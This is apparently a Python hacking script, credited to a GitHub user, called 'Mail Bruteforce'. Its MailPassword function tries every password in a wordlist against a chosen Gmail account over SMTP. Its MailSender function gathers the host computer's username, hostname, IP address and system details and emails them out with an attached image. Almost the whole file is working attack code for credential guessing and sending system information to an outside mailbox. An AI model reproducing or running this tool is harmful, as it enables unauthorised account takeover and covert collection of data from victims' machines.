import os 
import imghdr  
from time import sleep
import getpass
import socket
import platform
import smtplib
from email.message import EmailMessage
import sys

# github.com/vLeeH - 2021
# Disable the less secure apps in your google account.

def banner():
    os.system('cls' if os.name == 'nt' else 'clear') 
    sleep(0.5)
    mail_banner ='''\033[31m
      __  __      _ _   ___          _        __                
     |  \/  |__ _(_) | | _ )_ _ _  _| |_ ___ / _|___ _ _ __ ___ 
     | |\/| / _` | | | | _ \ '_| || |  _/ -_)  _/ _ \ '_/ _/ -_)
     |_|  |_\__,_|_|_| |___/_|  \_,_|\__\___|_| \___/_| \__\___|
    \033[0m'''
    print(mail_banner)
    sleep(1)


def MailPassword(): 
    gmail = str(input("[*] Enter the email: "))

    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.ehlo()
        server.starttls()

        passwfile = open('src/wordlist.txt', 'r')

        for password in passwfile:
            try:
                server.login(gmail, password)
                print("[+] Email: {} - Password: {}".format(gmail, password))
                break

            except smtplib.SMTPAuthenticationError:
                print("[+] Email: {} - Try this password: {}".format(gmail, password))
    
    except Exception as e: 
        print()
        print(f'\033[31m ![ERROR] {e}\033[0m')


def MailSender(send_email, rec_email, password): 
    # Computer Informations
    username = getpass.getuser()
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    inf="{}\n{}\n\n> System.inf\n{}\n{}\n{}\n\n> Raw:\n{}".format(hostname,IPAddr,platform.node(),platform.system(),platform.processor(),platform.uname())

    # Informations
    subject = f'Check The Message {username}.'
    msg = EmailMessage()
    msg['subject'] = subject
    msg['From'] = send_email
    msg['To'] = rec_email

    # HTML message :P
    msg.set_content('Image attached')
    msg.add_alternative('''
        <!DOCTYPE html>
        <html lang="en">
            <body>
                <h1 style="color: gray;">See the image and the Computer Informations ↙</h1>
                <h2>The computer informations:</h2><br>
                {}
            </body>
        </html>
    '''.format(inf), subtype='html')

    # Files
    files= ['directory/image.jpg']
    for file in files: 
        try: 
            with open(file, 'rb') as f: 
                file_data=f.read()
                file_type=imghdr.what(f.name)
                file_name=f.name

            msg.add_attachment(file_data, maintype = 'image', subtype=file_type, filename=file_name)

        except Exception as e: 
            print()
            print(f'\033[31m ![ERROR] {e}\033[0m')

    # Send the email
    try: 
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp: 
            smtp.login(send_email, password)
            print(f'Login in the email {send_email}')
            sleep(1)
            smtp.send_message(msg)
            print('\033[1;32m [+] Email has been sent to {}\033[0m'.format(rec_email))

    except Exception as e: 
        print()
        print(f'\033[31m ![ERROR] {e}\033[0m')


if __name__=='__main__': 
    banner()
    print()
    while True: 
        ask1 = str(input('[*] Do you wanna use mail tools?(y/n) ')).strip().lower()
        if ask1 == 'y':
            ask = str(
                input('[*] Bruteforce/Send? ')).lower().strip()
            if ask == 'bruteforce':
                MailPassword()
            elif ask == 'send':
                print()
                print('[+] Starting the Sender tool...')
                sleep(2)
                
                # Credentials
                send_email = os.getenv('SEND_MAIL')
                rec_email = os.getenv('REC_EMAIL')
                password = getpass.getpass('[*] Enter your password: ')
                MailSender(send_email, rec_email, password)
            else: 
                print()
                print('[!] Invalid answer.')

        elif ask1 == 'n': 
            print()
            print('[+] Thanks for using this tool! ')
            break
        
        else: 
            print()
            print('[!] Invalid answer.')
